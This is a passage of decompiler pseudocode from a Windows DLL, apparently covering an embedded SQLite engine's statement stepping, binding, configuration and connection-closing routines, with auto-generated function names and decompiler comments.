    sub_10061317(*(_DWORD *)(*(_DWORD *)a1 + 68));
  }
  return v1;
}

//----- (100530A3) --------------------------------------------------------
int __thiscall sub_100530A3(int this)
{
  __int16 v1; // ax

  v1 = *(_WORD *)(this + 28);
  if ( (v1 & 0x12) == 0 )
    return sub_100530C6(this);
  *(_WORD *)(this + 28) = v1 & 0xFFED | 0x10;
  return *(_DWORD *)(this + 20);
}

//----- (100530C6) --------------------------------------------------------
int __cdecl sub_100530C6(int a1)
{
  return sub_1005A7DD(a1, 1u);
}

//----- (100530D9) --------------------------------------------------------
int __cdecl sub_100530D9(int a1)
{
  return sub_1005A7DD(a1, 2u);
}

//----- (100530EC) --------------------------------------------------------
int __usercall sub_100530EC@<eax>(
        void (__cdecl *a1)(int a1, unsigned int a2)@<eax>,
        int a2@<ecx>,
        int a3@<esi>,
        _BYTE *Src,
        char a5)
{
  int result; // eax

  result = sub_1005A3FE(a1, a3 + 8, a2, Src, a5);
  if ( result == 18 )
    return sub_10053178(a3);
  return result;
}

//----- (1005310E) --------------------------------------------------------
__int16 __usercall sub_1005310E@<ax>(int a1@<eax>, double a2)
{
  return sub_1005A2A1(a1 + 8, a2);
}

//----- (1005312B) --------------------------------------------------------
int __usercall sub_1005312B@<eax>(int a1@<eax>, _BYTE *Src)
{
  *(_DWORD *)(a1 + 52) = 1;
  return sub_1005A3FE((void (__cdecl *)(int, unsigned int))0xFFFFFFFF, a1 + 8, -1, Src, 1);
}

//----- (1005314B) --------------------------------------------------------
int __usercall sub_1005314B@<eax>(int a1@<eax>, int a2@<ecx>)
{
  return sub_1005A280(a2 + 8, a1, a1 >> 31);
}

//----- (1005315D) --------------------------------------------------------
int __usercall sub_1005315D@<eax>(int a1@<eax>, int a2, int a3)
{
  return sub_1005A280(a1 + 8, a2, a3);
}

//----- (10053178) --------------------------------------------------------
int __usercall sub_10053178@<eax>(int a1@<eax>)
{
  *(_DWORD *)(a1 + 52) = 18;
  return sub_1005A3FE(0, a1 + 8, -1, aStringOrBlobTo, 1);
}

//----- (10053198) --------------------------------------------------------
int __usercall sub_10053198@<eax>(int a1@<esi>)
{
  int result; // eax

  sub_1005A1F4(a1 + 8);
  result = *(_DWORD *)(a1 + 24);
  *(_DWORD *)(a1 + 52) = 7;
  *(_BYTE *)(result + 30) = 1;
  return result;
}

//----- (100531B1) --------------------------------------------------------
int __usercall sub_100531B1@<eax>(int a1@<eax>)
{
  _DWORD *v3; // ebx
  int v4; // eax
  int v5; // eax
  int v6; // eax
  int v7; // edi
  int v9; // [esp+Ch] [ebp-4h]

  if ( *(_DWORD *)(a1 + 68) != -1108210269 )
    return 21;
  v3 = *(_DWORD **)a1;
  if ( *(_BYTE *)(*(_DWORD *)a1 + 30) )
    return 7;
  v4 = *(_DWORD *)(a1 + 84);
  if ( v4 > 0 )
    goto LABEL_18;
  if ( !*(_BYTE *)(a1 + 98) )
  {
    if ( v4 < 0 )
    {
      if ( !v3[35] )
        v3[54] = 0;
      ++v3[35];
      if ( !*(_BYTE *)(a1 + 102) )
        ++v3[36];
      *(_DWORD *)(a1 + 84) = 0;
    }
LABEL_18:
    v6 = sub_1005C850((unsigned int *)a1);
    v3[5] = v6;
    v9 = v6;
    if ( sub_1005922F(*(_DWORD *)a1, *(_DWORD *)(a1 + 88)) == 7 )
      *(_DWORD *)(a1 + 88) = 7;
    goto LABEL_20;
  }
  v5 = *(_DWORD *)(a1 + 88);
  if ( !v5 || v5 == 17 )
    *(_DWORD *)(a1 + 88) = 17;
  v9 = 1;
LABEL_20:
  if ( *(_BYTE *)(a1 + 103) && v9 != 100 && v9 != 101 )
  {
    v7 = *(_DWORD *)(a1 + 88);
    v3[5] = v7;
    v9 = v7;
  }
  return v9 & v3[6];
}

//----- (1005326B) --------------------------------------------------------
int __cdecl sub_1005326B(int a1)
{
  int v1; // ebx
  int v2; // esi
  int v3; // ebx
  int v4; // eax
  char *Src; // [esp+Ch] [ebp-4h]
  _BYTE *Srca; // [esp+Ch] [ebp-4h]

  v1 = 21;
  if ( a1 )
  {
    v2 = *(_DWORD *)a1;
    Src = 0;
    sub_10061305(*(_DWORD *)(*(_DWORD *)a1 + 68));
    v3 = sub_100531B1(a1);
    if ( v3 == 17 )
    {
      do
      {
        v4 = (int)Src++;
        if ( v4 >= 5 )
          break;
        v3 = sub_1005889A((_DWORD *)a1);
        if ( v3 )
          break;
        sub_10053046(a1);
        *(_BYTE *)(a1 + 98) = 0;
        v3 = sub_100531B1(a1);
      }
      while ( v3 == 17 );
      if ( v3 == 17 && *(_BYTE *)(a1 + 103) && *(_DWORD *)(v2 + 200) )
      {
        Srca = (_BYTE *)sub_100530C6(*(_DWORD *)(v2 + 200));
        sub_10058EC7(v2, *(_DWORD *)(a1 + 92));
        if ( *(_BYTE *)(v2 + 30) )
        {
          *(_DWORD *)(a1 + 92) = 0;
          *(_DWORD *)(a1 + 88) = 7;
        }
        else
        {
          *(_DWORD *)(a1 + 92) = sub_10059194(Srca);
        }
      }
    }
    v1 = sub_1005922F(v2, v3);
    sub_10061317(*(_DWORD *)(v2 + 68));
  }
  return v1;
}

//----- (10053339) --------------------------------------------------------
void __usercall sub_10053339(int a1@<edi>, int a2)
{
  _BYTE *v2; // edi

  v2 = (_BYTE *)sub_10055521(
                  a1,
                  a2,
                  "unable to use function %s in the requested context",
                  *(const char **)(*(_DWORD *)a2 + 24));
  sub_1005312B(a2, v2);
  sub_10058E74((int)v2);
}

//----- (1005336A) --------------------------------------------------------
int __usercall sub_1005336A@<eax>(_DWORD *a1@<esi>, int Size)
{
  int v2; // edi
  void *v3; // eax

  v2 = a1[12];
  if ( (*(_WORD *)(v2 + 28) & 0x2000) == 0 )
  {
    if ( Size > 0 )
    {
      sub_10059D49(Size, v2, 0);
      *(_WORD *)(v2 + 28) = 0x2000;
      *(_DWORD *)v2 = *a1;
      v3 = *(void **)(v2 + 20);
      if ( v3 )
        memset(v3, 0, Size);
    }
    else
    {
      sub_10059F6C((int *)a1[12]);
      *(_DWORD *)(v2 + 20) = 0;
      *(_WORD *)(v2 + 28) = 1;
    }
  }
  return *(_DWORD *)(v2 + 20);
}

//----- (100533C0) --------------------------------------------------------
_DWORD *__usercall sub_100533C0@<eax>(int a1@<eax>, _DWORD **a2@<esi>)
{
  if ( a2 )
  {
    if ( a2[11] && a1 < *((unsigned __int16 *)a2 + 24) && a1 >= 0 )
    {
      sub_10061305((*a2)[17]);
      return &a2[11][10 * a1];
    }
    if ( *a2 )
    {
      sub_10061305((*a2)[17]);
      sub_100592B1(*a2, 25, 0);
    }
  }
  return &unk_100FF468;
}

//----- (10053411) --------------------------------------------------------
void __usercall sub_10053411(int *a1@<edi>)
{
  if ( a1 )
  {
    a1[22] = sub_1005922F(*a1, a1[22]);
    sub_10061317(*(_DWORD *)(*a1 + 68));
  }
}

//----- (10053431) --------------------------------------------------------
int __usercall sub_10053431@<eax>(int a1@<eax>, int *a2@<ecx>)
{
  _DWORD *v3; // eax
  int v4; // esi

  v3 = sub_100533C0(a1, (_DWORD **)a2);
  v4 = sub_100530C6((int)v3);
  sub_10053411(a2);
  return v4;
}

//----- (10053451) --------------------------------------------------------
int __usercall sub_10053451@<eax>(int a1@<eax>, int *a2@<ecx>)
{
  int v3; // esi

  v3 = *((unsigned __int8 *)sub_100533C0(a1, (_DWORD **)a2) + 30);
  sub_10053411(a2);
  return v3;
}

//----- (1005346C) --------------------------------------------------------
int __usercall sub_1005346C@<eax>(int a1@<eax>, int *a2@<ebx>)
{
  int v3; // edi
  int v5; // [esp+8h] [ebp-4h]

  v5 = 0;
  v3 = *a2;
  if ( a1 < *((unsigned __int16 *)a2 + 24) && a1 >= 0 )
  {
    sub_10061305(*(_DWORD *)(v3 + 68));
    v5 = sub_1005A7DD(a2[10] + 40 * a1, 1u);
    if ( *(_BYTE *)(v3 + 30) )
    {
      v5 = 0;
      *(_BYTE *)(v3 + 30) = 0;
    }
    sub_10061317(*(_DWORD *)(v3 + 68));
  }
  return v5;
}

//----- (100534C0) --------------------------------------------------------
int __usercall sub_100534C0@<eax>(_DWORD **a1@<esi>, int a2)
{
  int v3; // edi
  int v6; // [esp+14h] [ebp+8h]

  if ( !a1 )
    return 21;
  sub_10061305((*a1)[17]);
  if ( a1[17] != (_DWORD *)-1108210269 || (int)a1[21] >= 0 )
  {
    sub_100592B1(*a1, 21, 0);
    sub_10061317((*a1)[17]);
    return 21;
  }
  if ( a2 < 1 || a2 > *((__int16 *)a1 + 29) )
  {
    sub_100592B1(*a1, 25, 0);
    sub_10061317((*a1)[17]);
    return 25;
  }
  v6 = a2 - 1;
  v3 = (int)&a1[15][10 * a2 - 10];
  sub_10059FC7((int *)v3);
  *(_WORD *)(v3 + 28) = 1;
  sub_100592B1(*a1, 0, 0);
  if ( *((_BYTE *)a1 + 103) && (v6 < 32 && ((1 << v6) & (unsigned int)a1[53]) != 0 || a1[53] == (_DWORD *)-1) )
    *((_BYTE *)a1 + 98) = 1;
  return 0;
}

//----- (10053580) --------------------------------------------------------
int __usercall sub_10053580@<eax>(int a1@<eax>, _DWORD **a2@<edi>, _BYTE *Src, int a4)
{
  int v5; // esi
  int v6; // esi

  v5 = sub_100534C0(a2, a1);
  if ( !v5 )
  {
    if ( Src )
    {
      v6 = sub_1005A3FE(0, (int)&a2[15][10 * a1 - 10], a4, Src, 0);
      sub_100592B1(*a2, v6, 0);
      v5 = sub_1005922F((int)*a2, v6);
    }
    sub_10061317((*a2)[17]);
  }
  return v5;
}

//----- (100535DD) --------------------------------------------------------
int __usercall sub_100535DD@<eax>(_DWORD *a1@<ebx>, int a2@<edi>)
{
  int v3; // [esp+8h] [ebp-8h]
  int v4; // [esp+Ch] [ebp-4h]

  sub_10061305(*(_DWORD *)(*a1 + 68));
  v3 = 0;
  if ( *(__int16 *)(a2 + 58) > 0 )
  {
    v4 = 0;
    do
    {
      sub_1005A3D5(v4 + *(_DWORD *)(a2 + 60), (int *)(v4 + a1[15]));
      ++v3;
      v4 += 40;
    }
    while ( v3 < *(__int16 *)(a2 + 58) );
  }
  sub_10061317(*(_DWORD *)(*a1 + 68));
  return 0;
}

//----- (10053630) --------------------------------------------------------
char __stdcall sub_10053630(int a1)
{
  _DWORD v2[7]; // [esp+0h] [ebp-1Ch] BYREF

  v2[3] = v2;
  v2[6] = 0;
  sub_10058E74(*(_DWORD *)(a1 + 4));
  return 1;
}

//----- (10053676) --------------------------------------------------------
_DWORD *__stdcall sub_10053676(_DWORD *a1, int a2, int a3)
{
  _DWORD *v3; // eax
  int v5[2]; // [esp+8h] [ebp-14h] BYREF
  int v6; // [esp+18h] [ebp-4h]

  sub_1000E7F7(a1, 1, 0);
  v6 = 0;
  *a1 = &off_10104460;
  a1[1] = a3;
  sub_1000D17D(a1 + 2, &word_10130474);
  LOBYTE(v6) = 1;
  v3 = sub_10050A25(a2, v5);
  LOBYTE(v6) = 2;
  sub_10001236(v3 + 1, a1 + 3);
  LOBYTE(v6) = 1;
  sub_1000D3AD(v5);
  return a1;
}
// 10104460: using guessed type int (__thiscall *off_10104460)(void *Block, char);

//----- (100536F1) --------------------------------------------------------
_DWORD *__stdcall sub_100536F1(_DWORD *a1, int a2)
{
  sub_1000E7F7(a1, 1, 0);
  a1[1] = a2;
  *a1 = &off_10104460;
  sub_1000D17D(a1 + 2, &word_10130478);
  return a1;
}
// 10104460: using guessed type int (__thiscall *off_10104460)(void *Block, char);

//----- (1005373D) --------------------------------------------------------
_DWORD *__stdcall sub_1005373D(_DWORD *a1, int a2, int a3, int a4)
{
  sub_1000E7F7(a1, 1, 0);
  a1[1] = a2;
  *a1 = &off_10104460;
  sub_1000D372(a1 + 2, (int)&a3);
  sub_1000D3AD(&a3);
  return a1;
}
// 10104460: using guessed type int (__thiscall *off_10104460)(void *Block, char);

//----- (10053794) --------------------------------------------------------
void __thiscall sub_10053794(int *this)
{
  *this = (int)&off_10104460;
  sub_1000D3AD(this + 2);
  sub_1000E843(this);
}
// 10104460: using guessed type int (__thiscall *off_10104460)(void *Block, char);

//----- (100537CF) --------------------------------------------------------
_DWORD *__stdcall sub_100537CF(_DWORD *a1, int a2, int a3)
{
  sub_100536F1(a1, 20);
  a1[4] = a2;
  *a1 = &off_1010447C;
  a1[5] = a3;
  return a1;
}
// 1010447C: using guessed type int (__thiscall *off_1010447C)(void *Block, char);

//----- (10053811) --------------------------------------------------------
int __stdcall sub_10053811(int a1, int a2, char a3)
{
  wchar_t *v3; // eax
  _DWORD *v4; // ecx
  _DWORD *v6; // [esp-8h] [ebp-1Ch] BYREF
  int v7; // [esp-4h] [ebp-18h]
  void *v8; // [esp+4h] [ebp-10h]
  int v9; // [esp+10h] [ebp-4h]

  v3 = (wchar_t *)sub_1000CC40((int)&unk_10130480);
  v6 = v4;
  v8 = &v6;
  sub_1000D17D(&v6, v3);
  v9 = -1;
  sub_1005373D((_DWORD *)a1, 0, (int)v6, v7);
  v9 = 1;
  v7 = a2;
  v6 = (_DWORD *)(a1 + 16);
  *(_DWORD *)a1 = &off_10104474;
  sub_1000D372(v6, v7);
  *(_BYTE *)(a1 + 24) = a3;
  return a1;
}
// 1005382A: variable 'v4' is possibly undefined
// 10104474: using guessed type int (__thiscall *off_10104474)(void *Block, char);

//----- (1005387F) --------------------------------------------------------
int __usercall sub_1005387F@<eax>(int a1@<edi>, int a2@<esi>)
{
  int result; // eax
  int v3; // esi
  int v4; // eax
  int v5; // eax
  int v7; // [esp+4h] [ebp-4h]

  if ( dword_10182200 )
    return 0;
  result = sub_10061294();
  v3 = result;
  if ( !result )
  {
    v7 = sub_100612DC();
    sub_10061305(v7);
    dword_10182208 = 1;
    if ( dword_1018220C || (v3 = sub_10058A3A(0)) == 0 )
    {
      dword_1018220C = 1;
      if ( dword_10182214 || (v4 = sub_100612DC(), dword_10182214 = v4, !dword_1018214C) || v4 )
        ++dword_10182218;
      else
        v3 = 7;
    }
    sub_10061317(v7);
    if ( !v3 )
    {
      sub_10061305(dword_10182214);
      if ( !dword_10182200 && !dword_10182204 )
      {
        dword_10182204 = 1;
        memset(&unk_10194F20, 0, 0x5Cu);
        sub_10068BD7();
        if ( dword_10182210 )
          goto LABEL_18;
        if ( !dword_101821A8 )
          sub_10053A19(1, 0, 14, (int)&unk_10181DF8, a1, a2);
        v3 = dword_101821A8(dword_101821A4);
        if ( !v3 )
        {
LABEL_18:
          dword_10182210 = 1;
          v5 = sub_10058CA3(10);
          if ( v5 )
          {
            sub_10058E74(v5);
            sub_10067565((int)&unk_10180BC0);
            v3 = 0;
            sub_10066CAA(dword_101821F0, (int *)dword_101821EC, dword_101821F4);
            dword_10182200 = 1;
          }
          else
          {
            v3 = 7;
          }
        }
        dword_10182204 = 0;
      }
      sub_10061317(dword_10182214);
      sub_10061305(v7);
      if ( --dword_10182218 <= 0 )
      {
        sub_100612F3(dword_10182214);
        dword_10182214 = 0;
      }
      sub_10061317(v7);
    }
    return v3;
  }
  return result;
}
// 101821A8: invalid function type has been ignored
// 1005387F: could not find valid save-restore pair for edi
// 1005387F: could not find valid save-restore pair for esi
// 1018214C: using guessed type int dword_1018214C;
// 101821A4: using guessed type int dword_101821A4;
// 101821A8: using guessed type int (__cdecl *dword_101821A8)(_DWORD);
// 101821EC: using guessed type int dword_101821EC;
// 101821F0: using guessed type int dword_101821F0;
// 101821F4: using guessed type int dword_101821F4;
// 10182200: using guessed type int dword_10182200;
// 10182204: using guessed type int dword_10182204;
// 10182208: using guessed type int dword_10182208;
// 1018220C: using guessed type int dword_1018220C;
// 10182210: using guessed type int dword_10182210;
// 10182214: using guessed type int dword_10182214;
// 10182218: using guessed type int dword_10182218;

//----- (10053A19) --------------------------------------------------------
int __usercall sub_10053A19@<eax>(int a1@<edi>, int a2@<esi>, int a3, int a4, int a5, int a6)
{
  int v6; // ebx
  int *v8; // edi
  int *v9; // esi
  int v10; // [esp-Ch] [ebp-10h]

  v6 = 0;
  if ( dword_10182200 )
    return 21;
  switch ( a3 )
  {
    case 1:
      dword_1018214C = 0;
      goto LABEL_5;
    case 2:
      dword_1018214C = 1;
LABEL_5:
      dword_10182150 = 0;
      return v6;
    case 3:
      dword_1018214C = 1;
      dword_10182150 = 1;
      return v6;
    case 4:
      v10 = 8;
      v8 = &dword_10182160;
      goto LABEL_9;
    case 5:
      if ( !dword_10182160 )
        sub_10053A19(4, off_100FEB7C, a1, a2);
      v10 = 8;
      v9 = &dword_10182160;
      goto LABEL_12;
    case 6:
      dword_101821E0 = a4;
      dword_101821E4 = a5;
      dword_101821E8 = a6;
      return v6;
    case 7:
      dword_101821EC = a4;
      dword_101821F0 = a5;
      dword_101821F4 = a6;
      return v6;
    case 9:
      dword_10182148 = a4;
      return v6;
    case 10:
      v10 = 9;
      v8 = &dword_10182180;
      goto LABEL_9;
    case 11:
      v10 = 9;
      v9 = &dword_10182180;
      goto LABEL_12;
    case 13:
      dword_10182158 = a4;
      dword_1018215C = a5;
      return v6;
    case 14:
      v10 = 11;
      v8 = &dword_101821A4;
LABEL_9:
      v9 = (int *)a4;
      goto LABEL_10;
    case 15:
      if ( !dword_101821A8 )
        sub_10053A19(14, &unk_10181DF8, a1, a2);
      v10 = 11;
      v9 = &dword_101821A4;
LABEL_12:
      v8 = (int *)a4;
LABEL_10:
      qmemcpy(v8, v9, 4 * v10);
      break;
    default:
      v6 = 1;
      break;
  }
  return v6;
}
// 10053A19: could not find valid save-restore pair for edi
// 10053A19: could not find valid save-restore pair for esi
// 100FEB7C: using guessed type int (__cdecl *off_100FEB7C[2])(int);
// 10182148: using guessed type int dword_10182148;
// 1018214C: using guessed type int dword_1018214C;
// 10182150: using guessed type int dword_10182150;
// 10182158: using guessed type int dword_10182158;
// 1018215C: using guessed type int dword_1018215C;
// 10182160: using guessed type int dword_10182160;
// 10182180: using guessed type int dword_10182180;
// 101821A4: using guessed type int dword_101821A4;
// 101821A8: using guessed type int dword_101821A8;
// 101821E0: using guessed type int dword_101821E0;
// 101821E4: using guessed type int dword_101821E4;
// 101821E8: using guessed type int dword_101821E8;
// 101821EC: using guessed type int dword_101821EC;
// 101821F0: using guessed type int dword_101821F0;
// 101821F4: using guessed type int dword_101821F4;
// 10182200: using guessed type int dword_10182200;

//----- (10053B81) --------------------------------------------------------
int __usercall sub_10053B81@<eax>(int a1@<eax>, int a2@<esi>, int a3)
{
  int v3; // ebx
  unsigned int v6; // edi
  int v7; // ecx
  _DWORD *i; // eax

  v3 = 0;
  if ( *(_DWORD *)(a2 + 228) )
    return 5;
  if ( *(_BYTE *)(a2 + 227) )
    sub_10058E74(*(_DWORD *)(a2 + 240));
  if ( a1 <= 4 )
    a1 = 0;
  if ( a3 < 0 )
    a3 = 0;
  if ( a1 && a3 )
  {
    v6 = (a1 + 7) & 0xFFFFFFF8;
    sub_10069106();
    v3 = sub_10058C4C(a3 * v6);
    sub_10069112();
  }
  else
  {
    v6 = 0;
  }
  *(_DWORD *)(a2 + 236) = 0;
  *(_DWORD *)(a2 + 240) = v3;
  *(_WORD *)(a2 + 224) = v6;
  if ( v3 )
  {
    v7 = a3;
    for ( i = (_DWORD *)v3; --v7 >= 0; i = (_DWORD *)((char *)i + v6) )
    {
      *i = *(_DWORD *)(a2 + 236);
      *(_DWORD *)(a2 + 236) = i;
    }
    *(_DWORD *)(a2 + 244) = i;
    *(_BYTE *)(a2 + 226) = 1;
    *(_BYTE *)(a2 + 227) = 1;
  }
  else
  {
    *(_DWORD *)(a2 + 244) = 0;
    *(_BYTE *)(a2 + 226) = 0;
    *(_BYTE *)(a2 + 227) = 0;
  }
  return 0;
}

//----- (10053C4E) --------------------------------------------------------
BOOL __usercall sub_10053C4E@<eax>(int a1@<eax>, int a2)
{
  while ( a1 > 0 && *(_BYTE *)(a2 + a1 - 1) == 32 )
    --a1;
  return a1 == 0;
}

//----- (10053C6D) --------------------------------------------------------
int __cdecl sub_10053C6D(int a1, int a2, void *Buf1, signed int Size, void *Buf2)
{
  size_t v5; // esi
  int v6; // edx

  v5 = Size;
  if ( a2 < Size )
    v5 = a2;
  v6 = memcmp(Buf1, Buf2, v5);
  if ( !v6 && (!a1 || !sub_10053C4E(a2 - v5, (int)Buf1 + v5) || !sub_10053C4E(Size - v5, (int)Buf2 + v5)) )
    return a2 - Size;
  return v6;
}
// 10053CC8: variable 'v6' is possibly undefined

//----- (10053CCD) --------------------------------------------------------
int __cdecl sub_10053CCD(int a1, int a2, _BYTE *a3, int a4, unsigned __int8 *a5)
{
  int v5; // edx
  int result; // eax

  v5 = a2;
  if ( a2 >= a4 )
    v5 = a4;
  result = sub_100593F9(a3, v5, a5);
  if ( !result )
    return a2 - a4;
  return result;
}

//----- (10053CF5) --------------------------------------------------------
void __usercall sub_10053CF5(int a1@<esi>)
{
  unsigned int v1; // [esp-4h] [ebp-8h]

  while ( *(_DWORD *)(a1 + 448) )
  {
    v1 = *(_DWORD *)(a1 + 448);
    *(_DWORD *)(a1 + 448) = *(_DWORD *)(v1 + 16);
    sub_10058EC7(a1, v1);
  }
  *(_DWORD *)(a1 + 452) = 0;
  *(_DWORD *)(a1 + 456) = 0;
  *(_BYTE *)(a1 + 460) = 0;
}

//----- (10053D2E) --------------------------------------------------------
int __usercall sub_10053D2E@<eax>(int a1@<eax>)
{
  int v3; // ebx
  int v4; // edx
  int v5; // eax
  int v6; // esi
  int v7; // eax
  unsigned int *v8; // ebx
  unsigned int i; // eax
  unsigned int v10; // esi
  _DWORD *j; // esi
  unsigned int v12; // eax
  void (__cdecl **v13)(_DWORD); // ebx
  _DWORD *k; // esi
  unsigned int v15; // ebx
  void (__cdecl *v16)(_DWORD); // eax
  int *v17; // esi
  int v18; // eax
  int v20; // [esp-4h] [ebp-1Ch]
  unsigned int v21; // [esp+10h] [ebp-8h]
  unsigned int v22; // [esp+10h] [ebp-8h]
  int v23; // [esp+14h] [ebp-4h]
  int v24; // [esp+14h] [ebp-4h]
  int v25; // [esp+14h] [ebp-4h]

  if ( a1 )
  {
    if ( !sub_10059D05(a1) )
      return 21;
    sub_10061305(*(_DWORD *)(a1 + 68));
    sub_1006A029(0, (_DWORD *)a1);
    sub_10071629(a1, 68);
    v3 = 0;
    if ( *(_DWORD *)(a1 + 136) )
    {
      sub_100592B1((_DWORD *)a1, 5, aUnableToCloseD);
LABEL_7:
      sub_10061317(*(_DWORD *)(a1 + 68));
      return 5;
    }
    v4 = 0;
    if ( *(int *)(a1 + 4) > 0 )
    {
      v5 = *(_DWORD *)(a1 + 8) + 4;
      while ( !*(_DWORD *)v5 || !*(_DWORD *)(*(_DWORD *)v5 + 16) )
      {
        ++v4;
        v5 += 16;
        if ( v4 >= *(_DWORD *)(a1 + 4) )
          goto LABEL_13;
      }
      sub_100592B1((_DWORD *)a1, 5, aUnableToCloseD_0);
      goto LABEL_7;
    }
LABEL_13:
    sub_10053CF5(a1);
    if ( *(int *)(a1 + 4) > 0 )
    {
      v23 = 0;
      do
      {
        v6 = v23 + *(_DWORD *)(a1 + 8);
        v7 = *(_DWORD *)(v6 + 4);
        if ( v7 )
        {
          sub_1006256A(v7);
          *(_DWORD *)(v6 + 4) = 0;
          if ( v3 != 1 )
            *(_DWORD *)(v6 + 12) = 0;
        }
        v23 += 16;
        ++v3;
      }
      while ( v3 < *(_DWORD *)(a1 + 4) );
    }
    sub_1006A029(0, (_DWORD *)a1);
    v8 = (unsigned int *)(a1 + 292);
    v24 = 23;
    do
    {
      for ( i = *v8; i; i = v21 )
      {
        v21 = *(_DWORD *)(i + 28);
        do
        {
          v10 = *(_DWORD *)(i + 8);
          sub_10058EC7(a1, i);
          i = v10;
        }
        while ( v10 );
      }
      ++v8;
      --v24;
    }
    while ( v24 );
    for ( j = *(_DWORD **)(a1 + 392); j; j = (_DWORD *)*j )
    {
      v12 = j[2];
      v22 = v12;
      v13 = (void (__cdecl **)(_DWORD))(v12 + 16);
      v25 = 3;
      do
      {
        if ( *v13 )
        {
          (*v13)(*(v13 - 2));
          v12 = v22;
        }
        v13 += 5;
        --v25;
      }
      while ( v25 );
      sub_10058EC7(a1, v12);
    }
    sub_10068E02((_DWORD *)(a1 + 384));
    for ( k = *(_DWORD **)(a1 + 268); k; k = (_DWORD *)*k )
    {
      v15 = k[2];
      v16 = *(void (__cdecl **)(_DWORD))(v15 + 12);
      if ( v16 )
        v16(*(_DWORD *)(v15 + 8));
      sub_10058EC7(a1, v15);
    }
    sub_10068E02((_DWORD *)(a1 + 260));
    sub_100592B1((_DWORD *)a1, 0, 0);
    v17 = *(int **)(a1 + 200);
    if ( v17 )
      sub_1005AA4D(v17);
    v18 = *(_DWORD *)(a1 + 8);
    *(_DWORD *)(a1 + 56) = -1254786768;
    sub_10058EC7(a1, *(_DWORD *)(v18 + 28));
    sub_10061317(*(_DWORD *)(a1 + 68));
    v20 = *(_DWORD *)(a1 + 68);
    *(_DWORD *)(a1 + 56) = -1623446221;
    sub_100612F3(v20);
    if ( *(_BYTE *)(a1 + 227) )
      sub_10058E74(*(_DWORD *)(a1 + 240));
    sub_10058E74(a1);
  }
  return 0;
}

//----- (10053F1F) --------------------------------------------------------
int (__cdecl *__usercall sub_10053F1F@<eax>(int a1@<eax>))(_DWORD)
{
  int v1; // esi
  int v3; // eax
  int v4; // ebx
  int (__cdecl *result)(_DWORD); // eax
  int v6; // [esp+10h] [ebp-8h]
  int i; // [esp+14h] [ebp-4h]

  v1 = 0;
  v6 = 0;
  sub_10069106();
  for ( i = 0; i < *(_DWORD *)(a1 + 4); v1 += 16 )
  {
    v3 = *(_DWORD *)(a1 + 8);
    v4 = *(_DWORD *)(v3 + v1 + 4);
    if ( v4 )
    {
      if ( sub_10066C14(*(_DWORD *)(v3 + v1 + 4)) )
        v6 = 1;
      sub_100632C4(v4);
      *(_BYTE *)(*(_DWORD *)(a1 + 8) + v1 + 8) = 0;
    }
    ++i;
  }
  sub_10071629(a1, 68);
  sub_10069112();
  if ( (*(_WORD *)(a1 + 12) & 0x200) != 0 )
  {
    sub_1005C640(a1);
    sub_1006A029(0, (_DWORD *)a1);
  }
  result = *(int (__cdecl **)(_DWORD))(a1 + 176);
  *(_DWORD *)(a1 + 464) = 0;
  *(_DWORD *)(a1 + 468) = 0;
  if ( result && (v6 || !*(_BYTE *)(a1 + 28)) )
    return (int (__cdecl *)(_DWORD))result(*(_DWORD *)(a1 + 172));
  return result;
}

//----- (10053FC9) --------------------------------------------------------
char *__usercall sub_10053FC9@<eax>(unsigned __int8 a1@<al>)
{
  char *result; // eax

  if ( a1 > 0x1Au )
    return aUnknownError;
  result = off_100FF348[a1];
  if ( !result )
    return aUnknownError;
  return result;
}
// 100FF348: using guessed type char *off_100FF348[2];

//----- (10053FE4) --------------------------------------------------------
int __usercall sub_10053FE4@<eax>(int *a1@<esi>, int a2)
{
  int v3; // [esp-8h] [ebp-8h]

  sub_10061305(a1[17]);
  v3 = a1[17];
  a1[102] = 0;
  a1[100] = (int)sub_10050A67;
  a1[101] = a2;
  sub_10061317(v3);
  return 0;
}

//----- (10054017) --------------------------------------------------------
int __cdecl sub_10054017(_DWORD *a1, unsigned __int8 *Src, int a3, int a4, int a5, int a6, int a7, int a8)
{
  int v8; // edx
  void *v9; // ecx
  int v10; // ebx
  int result; // eax
  _DWORD *v12; // eax
  _DWORD *v13; // eax
  int v14; // [esp-4h] [ebp-14h]
  int Size; // [esp+Ch] [ebp-4h]

  if ( !Src )
    return 21;
  if ( a6 )
  {
    if ( !a8 )
      goto LABEL_4;
    return 21;
  }
  if ( a8 )
  {
    if ( a7 )
      goto LABEL_5;
    return 21;
  }
LABEL_4:
  if ( a7 )
    return 21;
LABEL_5:
  if ( (unsigned int)(a3 + 1) > 0x80 )
    return 21;
  Size = (int)sub_10059297(Src);
  if ( Size > 255 )
    return 21;
  v10 = a4;
  if ( a4 == 4 )
  {
    v14 = 2;
LABEL_18:
    v10 = v14;
    goto LABEL_19;
  }
  if ( a4 != 5 )
  {
LABEL_19:
    v12 = sub_100697AC(Size, a3, (int)a1, Src, v10, v8);
    if ( v12 && *((unsigned __int8 *)v12 + 2) == v10 && *(__int16 *)v12 == a3 )
    {
      if ( a1[35] )
      {
        sub_100592B1(a1, 5, aUnableToDelete);
        return 5;
      }
      sub_1005C640((int)a1);
    }
    v13 = sub_100697AC(Size, a3, (int)a1, Src, v10, 1);
    if ( v13 )
    {
      v13[3] = a6;
      v13[4] = a7;
      v13[5] = a8;
      *((_BYTE *)v13 + 3) = 0;
      v13[1] = a5;
      *(_WORD *)v13 = a3;
      return 0;
    }
    return 7;
  }
  result = sub_10054017((int)a1, v9, a3, 1, a5, a6, a7, a8);
  if ( !result )
  {
    result = sub_10054017((int)a1, Src, a3, 2, a5, a6, a7, a8);
    if ( !result )
    {
      v14 = 3;
      v8 = 0;
      goto LABEL_18;
    }
  }
  return result;
}
// 1005408F: variable 'v9' is possibly undefined
// 100540CB: variable 'v8' is possibly undefined

//----- (10054151) --------------------------------------------------------
int __usercall sub_10054151@<eax>(_DWORD *a1@<eax>)
{
  int v2; // edi
  _BYTE *Size; // [esp+Ch] [ebp-4h]

  Size = sub_10059297(aMatch);
  sub_10061305(a1[17]);
  if ( !sub_100697AC((size_t)Size, 2, (int)a1, (unsigned __int8 *)aMatch, 1, 0) )
    sub_10054017(a1, (unsigned __int8 *)aMatch, 2, 1, 0, (int)sub_10053339, 0, 0);
  v2 = sub_1005922F((int)a1, 0);
  sub_10061317(a1[17]);
  return v2;
}

//----- (100541BA) --------------------------------------------------------
int __usercall sub_100541BA@<eax>(int a1@<ecx>, int a2@<edx>, char *a3@<eax>, int *a4@<edi>, int a5, int a6)
{
  int v7; // edx
  int v8; // esi

  v7 = a5 != 0;
  if ( (*(_DWORD *)(a1 + 12) & 0x20000) != 0 )
    v7 |= 2u;
